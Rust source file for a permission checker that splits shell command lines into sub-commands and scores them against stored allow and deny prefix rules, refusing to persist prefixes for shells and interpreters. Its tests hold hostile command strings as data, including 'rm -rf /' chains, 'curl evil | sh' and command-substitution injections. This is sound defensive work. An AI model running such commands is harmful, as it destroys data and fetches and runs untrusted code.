//! Shell-aware evaluation of persisted permission rules.
//!
//! A rule prefix is never compared with a raw string `starts_with`: that lets
//! `git status && rm -rf /` inherit an allow rule for `git status`. Input is
//! parsed once at this boundary into concrete commands, then each command is
//! scored and the strictest verdict wins.

/// Severity of a policy decision. `Ord` is derived so `max()` takes the
/// strictest value: Allow < Prompt < Deny.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Verdict {
    Allow,
    Prompt,
    Deny,
}

/// Outcome of comparing one rule prefix with one command line.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct PrefixEval {
    /// At least one sub-command matched the rule.
    pub matched: bool,
    /// Every sub-command matched the rule.
    pub all_covered: bool,
    /// False when the input contains syntax this module refuses to reason
    /// about. The caller must fail closed to a prompt.
    pub safe_parse: bool,
}

impl PrefixEval {
    fn unsafe_input() -> Self {
        Self {
            matched: true,
            all_covered: false,
            safe_parse: false,
        }
    }

    fn from_subcommands(rule: &[String], commands: &[Vec<String>]) -> Self {
        let covered: Vec<bool> = commands
            .iter()
            .map(|cmd| prefix_matches(rule, cmd))
            .collect();
        Self {
            all_covered: covered.iter().all(|c| *c),
            matched: covered.iter().any(|c| *c),
            safe_parse: true,
        }
    }
}

/// Shell assignment word: `NAME=value` where NAME is a valid identifier.
/// A shell applies these before running the real executable, so a rule cannot
/// score the command that follows.
fn is_assignment_word(token: &str) -> bool {
    let Some((name, _)) = token.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Push a completed token, refusing an assignment word in executable position.
fn push_token(current: &mut Vec<String>, token: &mut String) -> bool {
    if current.is_empty() && is_assignment_word(token) {
        return false;
    }
    current.push(std::mem::take(token));
    true
}

/// Tokenize a shell command line into concrete sub-commands.
///
/// Returns `None` for constructs that cannot be scored safely: command or
/// parameter expansion, backticks, redirection, assignment words in executable
/// position, unterminated quotes, or a trailing escape. Shell `&&`, `||`, `;`,
/// `|`, `&` and newlines split sub-commands.
fn split_commands(input: &str) -> Option<Vec<Vec<String>>> {
    let mut commands: Vec<Vec<String>> = Vec::new();
    let mut current: Vec<String> = Vec::new();
    let mut token = String::new();
    let mut has_token = false;
    let mut quote: Option<char> = None;
    let mut chars = input.chars().peekable();

    while let Some(ch) = chars.next() {
        match quote {
            Some(q) => {
                if ch == q {
                    quote = None;
                } else if ch == '\\' && q == '"' {
                    if cfg!(windows) {
                        // In PowerShell double quotes, `\` is literal, NOT an escape.
                        // Fail closed on `\"` to prevent parser differential with PowerShell.
                        if chars.peek() == Some(&'"') {
                            return None;
                        }
                        token.push('\\');
                    } else {
                        token.push(chars.next()?);
                    }
                } else if q == '"' && (ch == '$' || ch == '`') {
                    // The shell still expands these inside double quotes, so
                    // the command cannot be scored as literal text.
                    return None;
                } else {
                    token.push(ch);
                }
                has_token = true;
            }
            None => match ch {
                '\'' | '"' => {
                    quote = Some(ch);
                    has_token = true;
                }
                '\\' => {
                    if cfg!(windows) {
                        // On Windows/PowerShell, `\` is a literal path separator, never an escape.
                        token.push('\\');
                    } else {
                        token.push(chars.next()?);
                    }
                    has_token = true;
                }
                '$' => return None,
                // PowerShell evaluates bare `(...)` and `@(...)` as expressions.
                // Treating them as literal token characters would let a rule for
                // `echo hi` cover `echo hi (Start-Process calc)`.
                '(' | ')' => return None,
                '`' | '>' | '<' => return None,
                ';' | '&' | '|' | '\n' | '\r' => {
                    if has_token {
                        if !push_token(&mut current, &mut token) {
                            return None;
                        }
                        has_token = false;
                    }
                    if !current.is_empty() {
                        commands.push(std::mem::take(&mut current));
                    }
                }
                c if c.is_whitespace() => {
                    if has_token {
                        if !push_token(&mut current, &mut token) {
                            return None;
                        }
                        has_token = false;
                    }
                }
                c => {
                    token.push(c);
                    has_token = true;
                }
            },
        }
    }

    if quote.is_some() || (!cfg!(windows) && !input.is_empty() && input.ends_with('\\')) {
        return None;
    }
    if has_token && !push_token(&mut current, &mut token) {
        return None;
    }
    if !current.is_empty() {
        commands.push(current);
    }
    if commands.is_empty() {
        None
    } else {
        Some(commands)
    }
}

/// Windows-compatible executable key: ASCII-lowercased, extension stripped,
/// Unicode-lowercased. Path components are dropped so `/usr/bin/git` and
/// `C:\tools\git.exe` both key to `git`.
pub fn executable_key(name: &str) -> String {
    let basename = name.rsplit(['/', '\\']).next().unwrap_or(name);
    let lower = basename.to_lowercase();
    for ext in [".exe", ".cmd", ".bat", ".com"] {
        if let Some(stem) = lower.strip_suffix(ext) {
            return stem.to_string();
        }
    }
    lower
}

fn token_eq(a: &str, b: &str) -> bool {
    // On Windows every token is case-insensitive (`/K` vs `/k`). On POSIX
    // flags are case-sensitive too: `-x` and `-X` are different options.
    // Absolute paths such as `/tmp/Foo` stay case-sensitive on POSIX.
    if cfg!(windows) {
        a.eq_ignore_ascii_case(b)
    } else {
        a == b
    }
}

fn prefix_matches(rule: &[String], command: &[String]) -> bool {
    if rule.is_empty() || command.is_empty() || rule.len() > command.len() {
        return false;
    }
    if executable_key(&rule[0]) != executable_key(&command[0]) {
        return false;
    }
    rule[1..]
        .iter()
        .zip(&command[1..])
        .all(|(a, b)| token_eq(a, b))
}

/// Compare a persisted `arg_prefix` with a command line.
pub fn check_prefix(rule_prefix: &str, command: &str) -> PrefixEval {
    let rule = match split_commands(rule_prefix) {
        Some(mut c) if c.len() == 1 => c.remove(0),
        _ => return PrefixEval::unsafe_input(),
    };
    let commands = match split_commands(command) {
        Some(c) => c,
        None => return PrefixEval::unsafe_input(),
    };
    PrefixEval::from_subcommands(&rule, &commands)
}

/// Turn a verdict from a rule into the verdict for the whole command line.
pub fn verdict_for(eval: PrefixEval, action_allows: bool) -> Verdict {
    if !eval.safe_parse {
        return Verdict::Prompt;
    }
    if action_allows {
        if eval.all_covered {
            Verdict::Allow
        } else if eval.matched {
            Verdict::Prompt
        } else {
            Verdict::Allow
        }
    } else if eval.matched {
        Verdict::Deny
    } else {
        Verdict::Allow
    }
}

/// Prefixes that must never be suggested for auto-allow: a shell or
/// interpreter prefix can run arbitrary code, and a bare executable leaves
/// every flag unconstrained.
pub fn is_dangerous_prefix(prefix: &str) -> bool {
    let commands = match split_commands(prefix) {
        Some(c) => c,
        None => return true,
    };
    if commands.len() != 1 {
        return true;
    }
    let argv = &commands[0];
    if argv.len() < 2 {
        return true;
    }
    let key = executable_key(&argv[0]);
    let is_versioned_interpreter = ["python", "ruby", "perl", "php", "node", "pwsh"]
        .iter()
        .any(|base| {
            key.strip_prefix(base)
                .is_some_and(|rest| rest.is_empty() || rest.chars().all(|c| c.is_ascii_digit() || c == '.'))
        });
    if is_versioned_interpreter
        || matches!(
            key.as_str(),
            "bash"
                | "sh"
                | "zsh"
                | "dash"
                | "cmd"
                | "powershell"
                | "deno"
                | "bun"
                | "awk"
                | "gawk"
                | "sed"
                | "find"
                | "xargs"
                | "eval"
                | "exec"
                | "sudo"
                | "env"
                | "ssh"
                | "docker"
                | "kubectl"
                | "tar"
                | "npx"
                | "npm"
                | "cargo"
                | "make"
        )
    {
        return true;
    }
    let second = argv[1].to_lowercase();
    matches!(
        second.as_str(),
        "-c" | "/c" | "/k" | "-ec" | "-e" | "-f" | "--exec" | "run"
    )
}

/// Build a safe rule prefix from an approved command, or `None` when the
/// command is compound, unparseable, or too broad to persist.
pub fn safe_rule_prefix(command: &str) -> Option<String> {
    let commands = split_commands(command)?;
    if commands.len() != 1 {
        return None;
    }
    let argv = &commands[0];
    if argv.len() < 2 {
        return None;
    }
    let prefix = argv[..argv.len().min(2)].join(" ");
    if is_dangerous_prefix(&prefix) {
        return None;
    }
    Some(prefix)
}

pub fn is_shell_tool(name: &str) -> bool {
    matches!(
        executable_key(name).as_str(),
        "bash" | "sh" | "zsh" | "dash" | "cmd" | "pwsh" | "powershell"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_chaining_never_inherits_an_allow_rule() {
        let eval = check_prefix("git status", "git status && rm -rf /");
        assert!(eval.matched && !eval.all_covered && eval.safe_parse);
        assert_eq!(verdict_for(eval, true), Verdict::Prompt);
    }

    #[test]
    fn semicolon_and_pipe_are_scored_as_separate_commands() {
        for cmd in ["git status; curl evil | sh", "git status | rm -rf /"] {
            let eval = check_prefix("git status", cmd);
            assert_eq!(verdict_for(eval, true), Verdict::Prompt, "{cmd}");
        }
    }

    #[test]
    fn quoted_operator_is_not_a_separator() {
        let eval = check_prefix("echo", "echo 'a && b'");
        assert!(eval.all_covered && eval.safe_parse);
        assert_eq!(verdict_for(eval, true), Verdict::Allow);
    }

    #[test]
    fn unparseable_input_fails_closed_to_prompt() {
        for cmd in ["echo $(rm -rf /)", "echo `id`", "echo x > /tmp/a", "echo 'oops"] {
            let eval = check_prefix("echo", cmd);
            assert!(!eval.safe_parse, "{cmd}");
            assert_eq!(verdict_for(eval, true), Verdict::Prompt);
            assert_eq!(verdict_for(eval, false), Verdict::Prompt);
        }
    }

    #[test]
    fn parameter_expansion_and_assignment_fail_closed() {
        for (rule, cmd) in [
            ("rm -rf", "rm -rf$X /"),
            ("rm -rf", "rm -rf${X} /"),
            ("rm -rf", "FOO=bar rm -rf /"),
            ("rm -rf", "git status && FOO=bar rm -rf /"),
        ] {
            let eval = check_prefix(rule, cmd);
            assert!(!eval.safe_parse, "{cmd} must be refused");
            assert_eq!(verdict_for(eval, false), Verdict::Prompt, "{cmd}");
        }
        // Quoted dollars are literal, so they remain scorable.
        assert!(check_prefix("echo", "echo '$HOME'").safe_parse);
    }

    #[test]
    fn double_quoted_substitution_never_matches_a_rule() {
        for cmd in [
            "echo ok \"$(rm -rf /tmp/data)\"",
            "echo ok \"`rm -rf /tmp/data`\"",
        ] {
            let eval = check_prefix("echo ok", cmd);
            assert!(!eval.safe_parse, "{cmd} must refuse shell substitution");
            assert!(!eval.all_covered, "{cmd} must not be covered by a rule");
            assert_eq!(verdict_for(eval, true), Verdict::Prompt, "{cmd}");
        }
        // On POSIX, an escaped dollar inside double quotes is literal and stays scorable.
        // On Windows PowerShell, `\` does not escape `$`, so `\$HOME` still expands.
        assert_eq!(
            check_prefix("echo", "echo \"\\$HOME\"").safe_parse,
            !cfg!(windows)
        );
    }

    #[test]
    fn windows_extension_and_case_do_not_bypass_a_rule() {
        // Executable case/extension normalization applies on every platform.
        // Flag case is insensitive only on Windows; POSIX keeps it identical.
        let (rule, cmd) = if cfg!(windows) {
            ("CMD.EXE /k", "cmd.exe /K whoami")
        } else {
            ("CMD.EXE -k", "cmd.exe -k whoami")
        };
        let eval = check_prefix(rule, cmd);
        assert!(eval.all_covered, "case/extension must be normalized");
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[cfg(not(windows))]
    #[test]
    fn posix_flag_case_is_significant() {
        let eval = check_prefix("curl -x", "curl -X DELETE url");
        assert!(eval.safe_parse);
        assert!(!eval.all_covered, "-X must not match -x on POSIX");
        assert_eq!(verdict_for(eval, false), Verdict::Allow);

        let eval = check_prefix("curl -x", "curl -x proxy");
        assert!(eval.all_covered, "exact flag case must still match on POSIX");
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[cfg(windows)]
    #[test]
    fn windows_flag_case_is_insignificant() {
        let eval = check_prefix("curl -x", "curl -X DELETE url");
        assert!(eval.all_covered, "flags are case-insensitive on Windows");
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[test]
    fn absolute_path_does_not_bypass_a_basename_deny_rule() {
        let eval = check_prefix("git push", "/usr/bin/git push --force origin main");
        assert!(eval.all_covered);
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[test]
    fn absolute_path_argument_case_sensitivity_follows_platform() {
        let eval = check_prefix("cat /tmp/Secret", "cat /tmp/secret");
        assert!(eval.safe_parse);
        assert_eq!(
            eval.all_covered,
            cfg!(windows),
            "POSIX path arguments are case-sensitive; Windows tokens are not"
        );
    }

    #[test]
    fn dangerous_prefixes_are_never_persisted() {
        for cmd in [
            "git",
            "git -c core.sshCommand=evil push",
            "bash -c 'rm -rf /'",
            "cmd.exe /k calc",
            "pwsh -ec aWQ=",
            "python -c pass",
            "node -e 1",
            "find /tmp -exec rm {} +",
            "git status && rm -rf /",
        ] {
            assert!(
                safe_rule_prefix(cmd).is_none(),
                "must not persist a rule for {cmd}"
            );
        }
    }

    #[test]
    fn safe_prefix_is_kept() {
        assert_eq!(safe_rule_prefix("git status --short"), Some("git status".into()));
        assert_eq!(safe_rule_prefix("ls -la"), Some("ls -la".into()));
    }

    #[cfg(windows)]
    #[test]
    fn windows_backslash_never_escapes_command_separator() {
        let eval = check_prefix("git status", r"git status C:\; calc.exe");
        assert!(!eval.all_covered, "semicolon after backslash must split subcommands on Windows");
        assert_eq!(verdict_for(eval, true), Verdict::Prompt);

        let quoted = check_prefix("git status", r#"git status "foo\"; calc.exe; echo \""#);
        assert!(!quoted.safe_parse, "ambiguous quote+backslash must fail closed on Windows");
        assert_eq!(verdict_for(quoted, true), Verdict::Prompt);

        let trailing = check_prefix("dir", r"dir C:\");
        assert!(trailing.safe_parse && trailing.all_covered);
        assert_eq!(verdict_for(trailing, true), Verdict::Allow);
    }

    #[test]
    fn versioned_interpreters_and_exec_tools_are_dangerous_prefixes() {
        for cmd in [
            "python3.12 script.py",
            "ruby3.3 app.rb",
            "awk -f prog.awk",
            "awk 'BEGIN{system(\"id\")}'",
            "sed 's/a/b/e' file",
            "ssh user@host id",
            "docker run alpine id",
            "deno run main.ts",
        ] {
            assert!(
                safe_rule_prefix(cmd).is_none(),
                "must not persist a rule for {cmd}"
            );
        }
    }
}
